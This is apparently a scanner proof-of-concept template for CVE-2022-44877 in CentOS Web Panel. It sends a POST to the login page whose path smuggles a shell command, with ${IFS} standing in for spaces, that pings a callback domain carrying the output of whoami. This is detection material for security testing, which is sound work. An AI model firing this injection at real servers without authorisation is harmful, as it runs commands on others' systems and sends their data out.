name: yaml-poc-centos-webpanel-centos_web_panel-unauthorized_access-CVE-2022-44877
binding: 2b487a0b-5c19-4315-a1fa-0a69885af13b
detail:
    author: tonghan.guo
    links:
        - https://github.com/numanturle/CVE-2022-44877
    vulnerability:
        id: e28aaedf-6b16-4b7a-a24f-6daf08c9ddf0
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{reverseDomain}})
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: username=root&password=toor&commit=Login
            follow_redirects: false
        expression: response.status == 302 && reverse.wait(5)
expression: r0()
